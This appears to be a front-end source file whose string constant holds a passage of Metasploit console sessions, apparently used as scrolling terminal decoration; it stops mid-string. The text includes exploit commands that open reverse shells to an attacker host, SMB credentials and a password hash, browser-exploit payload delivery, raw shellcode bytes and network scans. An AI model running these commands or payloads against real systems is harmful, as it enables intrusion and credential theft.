import { randomItemFromArray, randomLineRepeatedString } from "../utils";

const stream =
  'root@kali:~# msfconsole -x "use exploit/multi/samba/usermap_script;\\\nset RHOST 172.16.194.172;\\\nset PAYLOAD cmd/unix/reverse;\\\nset LHOST 172.16.194.163;\\\nrun"\n\nroot@kali:~# msfcli exploit/multi/samba/usermap_script RHOST=172.16.194.172 PAYL\n[*] Please wait while we load the module tree...\n \n                ##                          ###           ##    ##\n ##  ##  #### ###### ####  #####   #####    ##    ####        ######\n####### ##  ##  ##  ##         ## ##  ##    ##   ##  ##   ###   ##\n####### ######  ##  #####   ####  ##  ##    ##   ##  ##   ##    ##\n## # ##     ##  ##  ##  ## ##      #####    ##   ##  ##   ##    ##\n##   ##  #### ###   #####   #####     ##   ####   ####   #### ###\n                                      ##\n\n\n       =[ metasploit v4.5.0-dev [core:4.5 api:1.0]\n+ -- --=[ 936 exploits - 500 auxiliary - 151 post\n+ -- --=[ 252 payloads - 28 encoders - 8 nops\n       =[ svn r15767 updated today (2012.08.22)\n\nRHOST => 172.16.194.172\nPAYLOAD > cmd/unix/reverse\n[*] Started reverse double handler\n[*] Accepted the first client connection...\n[*] Accepted the second client connection...\n[*] Command: echo cSKqD83oiquo0xMr;\n[*] Writing to socket A\n[*] Writing to socket B\n[*] Reading from sockets...\n[*] Reading from socket B\n[*] B: "cSKqD83oiquo0xMr\\r\\n"\n[*] Matching...\n[*] A is input...\n[*] Command shell session 1 opened (172.16.194.163:4444 -> 172.16.194.172:57682)\n\nuname -a\nLinux metasploitable 2.6.24-16-server #1 SMP Thu Apr 10 13:58:00 UTC 2008 i686 G\n\nroot@kali:~# msfcli exploit/multi/samba/usermap_script O\n[*] Initializing modules...\n\n   Name   Current Setting  Required  Description\n   ----   ---------------  --------  -----------\n   RHOST                   yes       The target address\n   RPORT  139              yes       The target port\n\nmsf exploit(ms08_067_netapi) > show options\n\nModule options (exploit/windows/smb/ms08_067_netapi):\n\n   Name     Current Setting  Required  Description\n   ----     ---------------  --------  -----------\n   RHOST    172.16.194.134   yes       The target address\n   RPORT    445              yes       Set the SMB service port\n   SMBPIPE  BROWSER          yes       The pipe name to use (BROWSER, SRVSVC)\n\nExploit target:\n\n   Id  Name\n   --  ----\n   0   Automatic Targeting\n\nmsf exploit(ms08_067_netapi) > check\n\n[*] Verifying vulnerable status... (path: 0x0000005a)\n[*] System is not vulnerable (status: 0x00000000)\n[*] The target is not exploitable.\nmsf  exploit(ms08_067_netapi) >\n\nmsf > connect 192.168.1.1 23\n[*] Connected to 192.168.1.1:23\nDD-WRT v24 std (c) 2008 NewMedia-NET GmbH\nRelease: 07/27/08 (SVN revision: 10011)\nDD-WRT login:\n\nmsf exploit(ms10_061_spoolss) > edit\n[*] Launching /usr/bin/vim /usr/share/metasploit-framework/modules/exploits/wind\n\nrequire \'msf/core\'\nrequire \'msf/windows_error\'\n\nclass Metasploit3 > Msf::Exploit::Remote\n  Rank = ExcellentRanking\n\n  include Msf::Exploit::Remote::DCERPC\n  include Msf::Exploit::Remote::SMB\n  include Msf::Exploit::EXE\n  include Msf::Exploit::WbemExec\n\n  def initialize(info = {})\n\nmsf > irb\n[*] Starting IRB shell...\n\n>> puts "Hello, metasploit!"\nHello, metasploit!\n=> nil\n>> Framework::Version\n=> "4.8.2-2014022601"\n\nmeterpreter > route\n\nNetwork routes\n==============\n\n    Subnet           Netmask          Gateway\n    ------           -------          -------\n    0.0.0.0          0.0.0.0          172.16.1.254\n    127.0.0.0        255.0.0.0        127.0.0.1\n    172.16.1.0       255.255.255.0    172.16.1.100\n    172.16.1.100     255.255.255.255  127.0.0.1\n    172.16.255.255   255.255.255.255  172.16.1.100\n    224.0.0.0        240.0.0.0        172.16.1.100\n    255.255.255.255  255.255.255.255  172.16.1.100\n\nmsf > set RHOSTS 192.168.1.0/24\nRHOSTS => 192.168.1.0/24\nmsf > set THREADS 50\nTHREADS => 50\nmsf > set\n\nGlobal\n======\n\n  Name     Value\n  ----     -----\n  RHOSTS   192.168.1.0/24\n  THREADS  50\n\nmsf > unset THREADS\nUnsetting THREADS...\nmsf > unset all\nFlushing datastore...\nmsf > set\n\nGlobal\n======\n\nNo entries in data store.\n\nmsf > setg LHOST 192.168.1.101\nLHOST => 192.168.1.101\nmsf > setg RHOSTS 192.168.1.0/24\nRHOSTS => 192.168.1.0/24\nmsf > setg RHOST 192.168.1.136\nRHOST => 192.168.1.136\n\nmsf > show nops\nNOP Generators\n==============\n\n   Name             Disclosure Date  Rank    Description\n   ----             ---------------  ----    -----------\n   armle/simple                      normal  Simple\n   mipsbe/better                     normal  Better\n   php/generic                       normal  PHP Nop Generator\n   ppc/simple                        normal  Simple\n   sparc/random                      normal  SPARC NOP Generator\n   tty/generic                       normal  TTY Nop Generator\n   x64/simple                        normal  Simple\n   x86/opty2                         normal  Opty2\n   x86/single_byte                   normal  Single Byte\n\n\nmsf > use dos/windows/smb/ms09_001_write\nmsf auxiliary(ms09_001_write) > show options\n\nModule options:\n\n   Name   Current Setting  Required  Description\n   ----   ---------------  --------  -----------\n   RHOST                   yes       The target address\n   RPORT  445              yes       Set the SMB service port\n\nmsf auxiliary(ms09_001_write) >\n\nmsf > use exploit/windows/smb/psexec\nmsf exploit(psexec) > set RHOST 192.168.1.100\nRHOST => 192.168.1.100\nmsf exploit(psexec) > set PAYLOAD windows/shell/reverse_tcp\nPAYLOAD => windows/shell/reverse_tcp\nmsf exploit(psexec) > set LHOST 192.168.1.5\nLHOST => 192.168.1.5\nmsf exploit(psexec) > set LPORT 4444\nLPORT => 4444\nmsf exploit(psexec) > set SMBUSER victim\nSMBUSER => victim\nmsf exploit(psexec) > set SMBPASS s3cr3t\nSMBPASS => s3cr3t\nmsf exploit(psexec) > exploit\n\n[*] Connecting to the server...\n[*] Started reverse handler\n[*] Authenticating as user \'victim\'...\n[*] Uploading payload...\n[*] Created \\hikmEeEM.exe...\n[*] Binding to 367abb81-9844-35f1-ad32-98f038001003:2.0@ncacn_np:192.168.1.100[\\\n[*] Bound to 367abb81-9844-35f1-ad32-98f038001003:2.0@ncacn_np:192.168.1.100[\\sv\n[*] Obtaining a service manager handle...\n[*] Creating a new service (ciWyCVEp - "MXAVZsCqfRtZwScLdexnD")...\n[*] Closing service handle...\n[*] Opening service...\n[*] Starting the service...\n[*] Removing the service...\n[*] Closing service handle...\n[*] Deleting \\hikmEeEM.exe...\n[*] Sending stage (240 bytes)\n[*] Command shell session 1 opened (192.168.1.5:4444 -> 192.168.1.100:1073)\n\nMicrosoft Windows XP [Version 5.1.2600]\n(C) Copyright 1985-2001 Microsoft Corp.\n\nC:\\WINDOWS\\system32>\n\nmsf > use exploit/windows/browser/ani_loadimage_chunksize\nmsf exploit(ani_loadimage_chunksize) > set URIPATH /\nURIPATH => /\nmsf exploit(ani_loadimage_chunksize) > set PAYLOAD windows/shell/reverse_tcp\nPAYLOAD => windows/shell/reverse_tcp\nmsf exploit(ani_loadimage_chunksize) > set LHOST 192.168.1.5\nLHOST => 192.168.1.5\nmsf exploit(ani_loadimage_chunksize) > set LPORT 4444\nLPORT => 4444\nmsf exploit(ani_loadimage_chunksize) > exploit\n[*] Exploit running as background job.\n\n[*] Started reverse handler\n[*] Using URL: http://0.0.0.0:8080/\n[*]  Local IP: http://192.168.1.5:8080/\n[*] Server started.\nmsf exploit(ani_loadimage_chunksize) >\n[*] Attempting to exploit ani_loadimage_chunksize\n[*] Sending HTML page to 192.168.1.100:1077...\n[*] Attempting to exploit ani_loadimage_chunksize\n[*] Sending Windows ANI LoadAniIcon() Chunk Size Stack Overflow (HTTP) to 192.16\n[*] Sending stage (240 bytes)\n[*] Command shell session 2 opened (192.168.1.5:4444 -> 192.168.1.100:1078)\n\nmsf exploit(ani_loadimage_chunksize) > sessions -i 2\n[*] Starting interaction with 2...\n\nMicrosoft Windows XP [Version 5.1.2600]\n(C) Copyright 1985-2001 Microsoft Corp.\n\nC:\\Documents and Settings\\victim\\Desktop>\n\nmsf > use  exploit/windows/smb/ms09_050_smb2_negotiate_func_index\nmsf exploit(ms09_050_smb2_negotiate_func_index) > help\n...snip...\nExploit Commands\n================\n\n    Command       Description\n    -------       -----------\n    check         Check to see if a target is vulnerable\n    exploit       Launch an exploit attempt\n    pry           Open a Pry session on the current module\n    reload        Just reloads the module\n    rerun         Alias for rexploit\n    rexploit      Reloads the module and launches an exploit attempt\n    run           Alias for exploit\n\nmsf exploit(ms09_050_smb2_negotiate_func_index) >\n\n\nmsf exploit(ms09_050_smb2_negotiate_func_index) > show options\n\nModule options (exploit/windows/smb/ms09_050_smb2_negotiate_func_index):\n\n   Name   Current Setting  Required  Description\n   ----   ---------------  --------  -----------\n   RHOST                   yes       The target address\n   RPORT  445              yes       The target port (TCP)\n\nExploit target:\n\n   Id  Name\n   --  ----\n   0   Windows Vista SP1/SP2 and Server 2008 (x86)\n\nmsf exploit(ms09_050_smb2_negotiate_func_index) > show evasion\nModule evasion options:\n\n   Name                           Current Setting  Required  Description\n   ----                           ---------------  --------  -----------\n   SMB::obscure_trans_pipe_level  0                yes       Obscure PIPE string\n   SMB::pad_data_level            0                yes       Place extra padding\n   SMB::pad_file_level            0                yes       Obscure path names \n   SMB::pipe_evasion              false            yes       Enable segmented re\n   SMB::pipe_read_max_size        1024             yes       Maximum buffer size\n   SMB::pipe_read_min_size        1                yes       Minimum buffer size\n   SMB::pipe_write_max_size       1024             yes       Maximum buffer size\n   SMB::pipe_write_min_size       1                yes       Minimum buffer size\n   TCP::max_send_size             0                no        Maxiumum tcp segmen\n   TCP::send_delay                0                no        Delays inserted bef\n\nmsf payload(shell_bind_tcp) > generate\n# windows/shell_bind_tcp - 341 bytes\n# http://www.metasploit.com\n# VERBOSE=false, LPORT=4444, RHOST=, EXITFUNC=process, \n# InitialAutoRunScript=, AutoRunScript=\nbuf = \n"\\xfc\\xe8\\x89\\x00\\x00\\x00\\x60\\x89\\xe5\\x31\\xd2\\x64\\x8b\\x52" +\n"\\x30\\x8b\\x52\\x0c\\x8b\\x52\\x14\\x8b\\x72\\x28\\x0f\\xb7\\x4a\\x26" +\n"\\x31\\xff\\x31\\xc0\\xac\\x3c\\x61\\x7c\\x02\\x2c\\x20\\xc1\\xcf\\x0d" +\n"\\x01\\xc7\\xe2\\xf0\\x52\\x57\\x8b\\x52\\x10\\x8b\\x42\\x3c\\x01\\xd0" +\n"\\x8b\\x40\\x78\\x85\\xc0\\x74\\x4a\\x01\\xd0\\x50\\x8b\\x48\\x18\\x8b" +\n"\\x58\\x20\\x01\\xd3\\xe3\\x3c\\x49\\x8b\\x34\\x8b\\x01\\xd6\\x31\\xff" +\n"\\x31\\xc0\\xac\\xc1\\xcf\\x0d\\x01\\xc7\\x38\\xe0\\x75\\xf4\\x03\\x7d" +\n"\\xf8\\x3b\\x7d\\x24\\x75\\xe2\\x58\\x8b\\x58\\x24\\x01\\xd3\\x66\\x8b" +\n"\\x0c\\x4b\\x8b\\x58\\x1c\\x01\\xd3\\x8b\\x04\\x8b\\x01\\xd0\\x89\\x44" +\n"\\x24\\x24\\x5b\\x5b\\x61\\x59\\x5a\\x51\\xff\\xe0\\x58\\x5f\\x5a\\x8b" +\n"\\x12\\xeb\\x86\\x5d\\x68\\x33\\x32\\x00\\x00\\x68\\x77\\x73\\x32\\x5f" +\n"\\x54\\x68\\x4c\\x77\\x26\\x07\\xff\\xd5\\xb8\\x90\\x01\\x00\\x00\\x29" +\n"\\xc4\\x54\\x50\\x68\\x29\\x80\\x6b\\x00\\xff\\xd5\\x50\\x50\\x50\\x50" +\n"\\x40\\x50\\x40\\x50\\x68\\xea\\x0f\\xdf\\xe0\\xff\\xd5\\x89\\xc7\\x31" +\n"\\xdb\\x53\\x68\\x02\\x00\\x11\\x5c\\x89\\xe6\\x6a\\x10\\x56\\x57\\x68" +\n"\\xc2\\xdb\\x37\\x67\\xff\\xd5\\x53\\x57\\x68\\xb7\\xe9\\x38\\xff\\xff" +\n"\\xd5\\x53\\x53\\x57\\x68\\x74\\xec\\x3b\\xe1\\xff\\xd5\\x57\\x89\\xc7" +\n"\\x68\\x75\\x6e\\x4d\\x61\\xff\\xd5\\x68\\x63\\x6d\\x64\\x00\\x89\\xe3" +\n"\\x57\\x57\\x57\\x31\\xf6\\x6a\\x12\\x59\\x56\\xe2\\xfd\\x66\\xc7\\x44" +\n"\\x24\\x3c\\x01\\x01\\x8d\\x44\\x24\\x10\\xc6\\x00\\x44\\x54\\x50\\x56" +\n"\\x56\\x56\\x46\\x56\\x4e\\x56\\x56\\x53\\x56\\x68\\x79\\xcc\\x3f\\x86" +\n"\\xff\\xd5\\x89\\xe0\\x4e\\x56\\x46\\xff\\x30\\x68\\x08\\x87\\x1d\\x60" +\n"\\xff\\xd5\\xbb\\xf0\\xb5\\xa2\\x56\\x68\\xa6\\x95\\xbd\\x9d\\xff\\xd5" +\n"\\x3c\\x06\\x7c\\x0a\\x80\\xfb\\xe0\\x75\\x05\\xbb\\x47\\x13\\x72\\x6f" +\n"\\x6a\\x00\\x53\\xff\\xd5"\n\nmsf > hosts\n\nHosts\n=====\n\naddress         mac                name            os_name  os_flavor  os_sp  pu\n-------         ---                ----            -------  ---------  -----  --\n172.16.194.134                                     Unknown                    de\n172.16.194.163                     172.16.194.163  Linux    Ubuntu            se\n172.16.194.172  00:0C:29:D1:62:80  172.16.194.172  Linux    Ubuntu            se\n\nmsf > services -p 21\n\nServices\n========\n\nhost            port  proto  name  state  info\n----            ----  -----  ----  -----  ----\n172.16.194.172  21    tcp    ftp   open   vsftpd 2.3.4\n\nmsf > db_nmap -A 172.16.194.134\n[*] Nmap: Starting Nmap 5.51SVN ( http://nmap.org ) at 2012-06-18 12:36 EDT\n[*] Nmap: Nmap scan report for 172.16.194.134\n[*] Nmap: Host is up (0.00031s latency).\n[*] Nmap: Not shown: 994 closed ports\n[*] Nmap: PORT     STATE SERVICE      VERSION\n[*] Nmap: 80/tcp   open  http         Apache httpd 2.2.17 ((Win32) mod_ssl/2.2.1\n[*] Nmap: HOP RTT     ADDRESS\n[*] Nmap: 1   0.31 ms 172.16.194.134\n[*] Nmap: OS and Service detection performed. Please report any incorrect result\n[*] Nmap: Nmap done: 1 IP address (1 host up) scanned in 14.91 seconds\nmsf >\n\nmsf > hosts\n\nHosts\n=====\n\naddress         mac                name  os_name            os_flavor  os_sp  pu\n-------         ---                ----  -------            ---------  -----  --\n172.16.194.134  00:0C:29:68:51:BB        Microsoft Windows  XP                se\n172.16.194.172  00:0C:29:D1:62:80        Linux              Ubuntu            se\n\nmsf > \nmsf >  db_export -h\nUsage:\n    db_export -f  [-a] [filename]\n    Format can be one of: xml, pwdump\n[-] No output file was specified\n\nmsf > db_export -f xml /root/msfu/Exported.xml\n[*] Starting export of workspace msfu to /root/msfu/Exported.xml [ xml ]...\n[*]     >> Starting export of report\n[*]     >> Starting export of hosts\n[*]     >> Starting export of events\n[*]     >> Starting export of services\n[*]     >> Starting export of credentials\n[*]     >> Starting export of web sites\n[*]     >> Starting export of web pages\n[*]     >> Starting export of web forms\n[*]     >> Starting export of web vulns\n[*]     >> Finished export of report\n[*] Finished export of workspace msfu to /root/msfu/Exported.xml [ xml ]...\n\nmsf  auxiliary(tcp) > hosts -c address,os_flavor -S Linux -R\n\nHosts\n=====\n\naddress         os_flavor\n-------         ---------\n172.16.194.172  Ubuntu\n\nRHOSTS => 172.16.194.172\n\nmsf  auxiliary(tcp) > run\n\n[*] 172.16.194.172:25 - TCP OPEN\n[*] 172.16.194.172:23 - TCP OPEN\n[*] 172.16.194.172:22 - TCP OPEN\n[*] 172.16.194.172:21 - TCP OPEN\n[*] 172.16.194.172:53 - TCP OPEN\n[*] 172.16.194.172:80 - TCP OPEN\n[*] 172.16.194.172:5432 - TCP OPEN\n[*] 172.16.194.172:5900 - TCP OPEN\n[*] 172.16.194.172:6000 - TCP OPEN\n[*] 172.16.194.172:6667 - TCP OPEN\n[*] 172.16.194.172:6697 - TCP OPEN\n[*] 172.16.194.172:8009 - TCP OPEN\n[*] 172.16.194.172:8180 - TCP OPEN\n[*] 172.16.194.172:8787 - TCP OPEN\n[*] Scanned 1 of 1 hosts (100% complete)\n[*] Auxiliary module execution completed\n\nmsf > services -c port,proto,state -p 70-81\nServices\n========\nhost           port proto state\n----           ---- ----- -----\n172.16.194.134 80   tcp   open\n172.16.194.172 75   tcp   closed\n172.16.194.172 71   tcp   closed\n172.16.194.172 72   tcp   closed\n172.16.194.172 73   tcp   closed\n172.16.194.172 74   tcp   closed\n172.16.194.172 70   tcp   closed\n172.16.194.172 76   tcp   closed\n172.16.194.172 77   tcp   closed\n172.16.194.172 78   tcp   closed\n172.16.194.172 79   tcp   closed\n172.16.194.172 80   tcp   open\n172.16.194.172 81   tcp  closed\n\nmsf > services -s http -c port 172.16.194.134 -o /root/msfu/http.csv\n\n[*] Wrote services to /root/msfu/http.csv\n\nmsf > hosts -S Linux -o /root/msfu/linux.csv\n[*] Wrote hosts to /root/msfu/linux.csv\n\nmsf > cat /root/msfu/linux.csv\n[*] exec: cat /root/msfu/linux.csv\n\naddress,mac,name,os_name,os_flavor,os_sp,purpose,info,comments\n"172.16.194.172","00:0C:29:D1:62:80","","Linux","Debian","","server","",""\n\nmsf > cat /root/msfu/http.csv\n[*] exec: cat /root/msfu/http.csv\n\nhost,port\n"172.16.194.134","80"\n"172.16.194.134","443"\n\nmsf > creds -a 172.16.194.134 -p 445 -u Administrator -P 7bf4f254b222bb24aad3b43\n[*] Time: 2012-06-20 20:31:42 UTC Credential: host=172.16.194.134 port=445 proto\n\nmsf > creds\n\nCredentials\n===========\n\nhost            port  user           pass                                       \n----            ----  ----           ----                                       \n172.16.194.134  445   Administrator  7bf4f254b222bb24aad3b435b51404ee:2892d26cdf\n\n[*] Found 1 credential.\n\nmeterpreter > ls\n\nListing: C:\\Documents and Settings\\victim\n=========================================\n\nMode              Size     Type  Last modified                   Name\n----              ----     ----  -------------                   ----\n40777/rwxrwxrwx   0        dir   Sat Oct 17 07:40:45 -0600 2009  .\n40777/rwxrwxrwx   0        dir   Fri Jun 19 13:30:00 -0600 2009  ..\n100666/rw-rw-rw-  218      fil   Sat Oct 03 14:45:54 -0600 2009  .recently-used.\n40555/r-xr-xr-x   0        dir   Wed Nov 04 19:44:05 -0700 2009  Application Dat\n\n\n\nmeterpreter> > resource resource.txt\n[*] Reading /root/resource.txt\n[*] Running ls\n\nListing: C:\\Documents and Settings\\Administrator\\Desktop\n========================================================\n\nMode              Size    Type  Last modified              Name\n----              ----    ----  -------------              ----\n40777/rwxrwxrwx   0       dir   2012-02-29 16:41:29 -0500  .\n40777/rwxrwxrwx   0       dir   2012-02-02 12:24:40 -0500  ..\n100666/rw-rw-rw-  606     fil   2012-02-15 17:37:48 -0500  IDA Pro Free.lnk\n100777/rwxrwxrwx  681984  fil   2012-02-02 15:09:18 -0500  Sc303.exe\n100666/rw-rw-rw-  608     fil   2012-02-28 19:18:34 -0500  Shortcut to Ability S\n100666/rw-rw-rw-  522     fil   2012-02-02 12:33:38 -0500  XAMPP Control Panel.l\n\n[*] Running background\n\n[*] Backgrounding session 1...\nmsf  exploit(handler) >\nmsf > use auxiliary/scanner/portscan/syn\nmsf auxiliary(syn) > show options\n\nModule options (auxiliary/scanner/portscan/syn):\n\n   Name       Current Setting  Required  Description\n   ----       ---------------  --------  -----------\n   BATCHSIZE  256              yes       The number of hosts to scan per set\n   DELAY      0                yes       The delay between connections, per thre\n   INTERFACE                   no        The name of the interface\n   JITTER     0                yes       The delay jitter factor (maximum value \n   PORTS      1-10000          yes       Ports to scan (e.g. 22-25,80,110-900)\n   RHOSTS                      yes       The target address range or CIDR identi\n   SNAPLEN    65535            yes       The number of bytes to capture\n   THREADS    1                yes       The number of concurrent threads\n   TIMEOUT    500              yes       The reply read timeout in milliseconds\n\nmsf auxiliary(syn) > set INTERFACE eth0\nINTERFACE => eth0\nmsf auxiliary(syn) > set PORTS 80\nPORTS => 80\nmsf auxiliary(syn) > set RHOSTS 192.168.1.0/24\nRHOSTS => 192.168.1.0/24\nmsf auxiliary(syn) > set THREADS 50\nTHREADS => 50\nmsf auxiliary(syn) > run\n\n[*] TCP OPEN 192.168.1.1:80\n[*] TCP OPEN 192.168.1.2:80\n[*] TCP OPEN 192.168.1.10:80\n[*] TCP OPEN 192.168.1.109:80\n[*] TCP OPEN 192.168.1.116:80\n[*] TCP OPEN 192.168.1.150:80\n[*] Scanned 256 of 256 hosts (100% complete)\n[*] Auxiliary module execution completed\n\nmsf > use auxiliary/scanner/portscan/tcp\nmsf  auxiliary(tcp) > show options\n\nModule options (auxiliary/scanner/portscan/tcp):\n\n   Name         Current Setting  Required  Description\n   ----         ---------------  --------  -----------\n   CONCURRENCY  10               yes       The number of concurrent ports to che\n   DELAY        0                yes       The delay between connections, per th\n   JITTER       0                yes       The delay jitter factor (maximum valu\n   PORTS        1-10000          yes       Ports to scan (e.g. 22-25,80,110-900)\n   RHOSTS                        yes       The target address range or CIDR iden\n   THREADS      1                yes       The number of concurrent threads\n   TIMEOUT      1000             yes       The socket connect timeout in millise\n\nmsf  auxiliary(tcp) > hosts -R\n\nHosts\n=====\n\naddress         mac                name  os_name  os_flavor  os_sp  purpose  inf\n-------         ---                ----  -------  ---------  -----  -------  ---\n172.16.194.172  00:0C:29:D1:62:80        Linux    Ubuntu            server      \n\nRHOSTS => 172.16.194.172\n\nmsf  auxiliary(tcp) > show options\n\nModule options (auxiliary/scanner/portscan/tcp):\n\n   Name         Current Setting  Required  Description\n   ----         ---------------  --------  -----------\n   CONCURRENCY  10               yes       The number of concurrent ports to che\n   FILTER                        no        The filter string for capturing traff\n   INTERFACE                     no        The name of the interface\n   PCAPFILE                      no        The name of the PCAP capture file to \n   PORTS        1-1024           yes       Ports to scan (e.g. 22-25,80,110-900)\n   RHOSTS       172.16.194.172   yes       The target address range or CIDR iden\n   SNAPLEN      65535            yes       The number of bytes to capture\n   THREADS      10                yes       The number of concurrent threads\n   TIMEOUT      1000             yes       The socket connect timeout in millise\n\nmsf  auxiliary(tcp) > run\n\n[*] 172.16.194.172:25 - TCP OPEN\n[*] 172.16.194.172:23 - TCP OPEN\n[*] 172.16.194.172:22 - TCP OPEN\n[*] 172.16.194.172:21 - TCP OPEN\n[*] 172.16.194.172:53 - TCP OPEN\n[*] 172.16.194.172:80 - TCP OPEN\n[*] 172.16.194.172:111 - TCP OPEN\n[*] 172.16.194.172:139 - TCP OPEN\n[*] 172.16.194.172:445 - TCP OPEN\n[*] 172.16.194.172:514 - TCP OPEN\n[*] 172.16.194.172:513 - TCP OPEN\n[*] 172.16.194.172:512 - TCP OPEN\n[*] Scanned 1 of 1 hosts (100% complete)\n[*] Auxiliary module execution completed\nmsf  auxiliary(tcp) > \nmsf auxiliary(ipidseq) > set RHOSTS 192.168.1.0/24\nRHOSTS => 192.168.1.0/24\nmsf auxiliary(ipidseq) > set THREADS 50\nTHREADS => 50\nmsf auxiliary(ipidseq) > run\n\n[*] 192.168.1.1\'s IPID sequence class: All zeros\n[*] 192.168.1.2\'s IPID sequence class: Incremental!\n[*] 192.168.1.10\'s IPID sequence class: Incremental!\n[*] 192.168.1.104\'s IPID sequence class: Randomized\n[*] 192.168.1.109\'s IPID sequence class: Incremental!\n[*] 192.168.1.111\'s IPID sequence class: Incremental!\n[*] 192.168.1.114\'s IPID sequence class: Incremental!\n[*] 192.168.1.116\'s IPID sequence class: All zeros\n[*] 192.168.1.124\'s IPID sequence class: Incremental!\n[*] 192.168.1.123\'s IPID sequence class: Incremental!\n[*] 192.168.1.137\'s IPID sequence class: All zeros\n[*] 192.168.1.150\'s IPID sequence class: All zeros\n[*] 192.168.1.151\'s IPID sequence class: Incremental!\n[*] Auxiliary module execution completed\n\nmsf auxiliary(ipidseq) > nmap -Pn -sI 192.168.1.109 192.168.1.114\n[*] exec: nmap -Pn -sI 192.168.1.109 192.168.1.114\n\nStarting Nmap 5.00 ( http://nmap.org ) at 2009-08-14 05:51 MDT\nIdle scan using zombie 192.168.1.109 (192.168.1.109:80); Class: Incremental\nInteresting ports on 192.168.1.114:\nNot shown: 996 closed|filtered ports\nPORT STATE SERVICE\n135/tcp open msrpc\n139/tcp open netbios-ssn\n445/tcp open microsoft-ds\n3389/tcp open ms-term-serv\nMAC Address: 00:0C:29:41:F2:E8 (VMware)\n\nNmap done: 1 IP address (1 host up) scanned in 5.56 seconds\nmsf > services -p 21 -c name,proto\n\nServices\n========\n\nhost            name  proto\n----            ----  -----\n172.16.194.172  ftp   tcp\n\nmsf > use auxiliary/scanner/ftp/ftp_version \n\nmsf  auxiliary(ftp_version) > set RHOSTS 172.16.194.172\nRHOSTS => 172.16.194.172\n\nmsf  auxiliary(anonymous) > show options\nModule options (auxiliary/scanner/ftp/anonymous):\n\n   Name     Current Setting      Required  Description\n   ----     ---------------      --------  -----------\n   FTPPASS  mozilla@example.com  no        The password for the specified userna\n   FTPUSER  anonymous            no        The username to authenticate as\n   RHOSTS   172.16.194.172       yes       The target address range or CIDR iden\n   RPORT    21                   yes       The target port\n   THREADS  1                    yes       The number of concurrent threads\n\nmsf  auxiliary(anonymous) > run\n[*] 172.16.194.172:21 Anonymous READ (220 (vsFTPd 2.3.4))\n[*] Scanned 1 of 1 hosts (100% complete)\n[*] Auxiliary module execution completed\n\nmsf auxiliary(psnuffle) > run\n[*] Auxiliary module execution completed\n[*] Loaded protocol FTP from /usr/share/metasploit-framework/data/exploits/psnuf\n[*] Loaded protocol IMAP from /usr/share/metasploit-framework/data/exploits/psnu\n[*] Loaded protocol POP3 from /usr/share/metasploit-framework/data/exploits/psnu\n[*] Loaded protocol URL from /usr/share/metasploit-framework/data/exploits/psnuf\n[*] Sniffing traffic.....\n[*] Successful FTP Login: 192.168.1.100:21-192.168.1.5:48614 >> victim / pass (2\n\nmsf > wmap_sites -h\n[*]  Usage: wmap_targets [options]\n  -h        Display this help text\n  -a [url]  Add site (vhost,url)\n  -l        List all available sites\n  -s [id]   Display site structure (vhost,url|ids) (level)\n\nmsf > wmap_sites -a http://172.16.194.172\n[*] Site created.\nmsf > wmap_sites -l\n[*] Available sites\n===============\n     Id  Host            Vhost           Port  Proto  # Pages  # Forms\n     --  ----            -----           ----  -----  -------  -------\n     0   172.16.194.172  172.16.194.172  80    http   0        0\n\nmsf > wmap_targets -l\n[*] Defined targets\n===============\n\n     Id  Vhost           Host            Port  SSL    Path\n     --  -----           ----            ----  ---    ----\n     0   172.16.194.172  172.16.194.172  80    false  /mutillidae/index.php\n\nmsf > wmap_run -t\n\n[*] Testing target:\n[*]   Site: 192.168.1.100 (192.168.1.100)\n[*]   Port: 80 SSL: false\n[*] ============================================================\n[*] Testing started. 2012-01-16 15:46:42 -0500\n[*] \n=[ SSL testing ]=\n[*] ============================================================\n[*] Target is not SSL. SSL modules disabled.\n[*] \n=[ Web Server testing ]=\n[*] ============================================================\n[*] Loaded auxiliary/admin/http/contentkeeper_fileaccess ...\n[*] Loaded auxiliary/admin/http/tomcat_administration ...\n[*] Loaded auxiliary/admin/http/tomcat_utf8_traversal ...\n[*] Loaded auxiliary/admin/http/trendmicro_dlp_traversal ...\n\nmsf >\nmsf > wmap_run -e\n[*] Using ALL wmap enabled modules.\n[-] NO WMAP NODES DEFINED. Executing local modules\n[*] Testing target:\n[*]   Site: 172.16.194.172 (172.16.194.172)\n[*]   Port: 80 SSL: false\n============================================================\n[*] Testing started. 2012-06-27 09:29:13 -0400\n[*] \n=[ SSL testing ]=\n============================================================\n[*] Target is not SSL. SSL modules disabled.\n[*] \n=[ Web Server testing ]=\n============================================================\n[*] Module auxiliary/scanner/http/http_version\n\n[*] Module auxiliary/scanner/http/open_proxy\n[*] Module auxiliary/scanner/http/robots_txt\n[*] Module auxiliary/scanner/http/soap_xml\n[*] Path: /\n[*] Module auxiliary/scanner/http/trace_axd\n[*] Path: /\n[*] Module auxiliary/scanner/http/verb_auth_bypass\n[*] \n=[ Unique Query testing ]=\n============================================================\n[*] Module auxiliary/scanner/http/blind_sql_query\n[*] Module auxiliary/scanner/http/error_sql_injection\n[*] Module auxiliary/scanner/http/http_traversal\n[*] Module auxiliary/scanner/http/rails_mass_assignment\n[*] Module exploit/multi/http/lcms_php_exec\n[*] \n=[ Query testing ]=\n============================================================\n[*] \n=[ General testing ]=\n============================================================\n++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++\nLaunch completed in 212.01512002944946 seconds.\n++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++\n[*] Done.\n\nmsf > wmap_vulns -l\n[*] + [172.16.194.172] (172.16.194.172): scraper /\n[*]   scraper Scraper\n[*]   GET Metasploitable2 - Linux\n[*] + [172.16.194.172] (172.16.194.172): directory /dav/\n[*]   directory Directory found.\n[*]   GET Res code: 200\n[*] + [172.16.194.172] (172.16.194.172): directory /cgi-bin/\n[*]   directory Directoy found.\n[*]   GET Res code: 403\n\nmsf > db_import /root/Nessus/nessus_scan.nbe\n[*] Importing \'Nessus NBE Report\' data\n[*] Importing host 172.16.194.254\n[*] Importing host 172.16.194.254\n[*] Importing host 172.16.194.254\n[*] Importing host 172.16.194.2\n[*] Importing host 172.16.194.2\n[*] Importing host 172.16.194.2\n...snip...\n[*] Importing host 172.16.194.1\n[*] Importing host 172.16.194.1\n[*] Importing host 172.16.194.1\n[*] Importing host 172.16.194.1\n[*] Importing host 172.16.194.1\n[*] Successfully imported /root/Nessus/nessus_scan.nbe\nmsf > \nmsf > services 172.16.194.172\n\nServices\n========\n\nhost            port   proto  name            state  info\n----            ----   -----  ----            -----  ----\n172.16.194.172  21     tcp    ftp             open   \n172.16.194.172  22     tcp    ssh             open   \n172.16.194.172  23     tcp    telnet          open   \n172.16.194.172  25     tcp    smtp            open   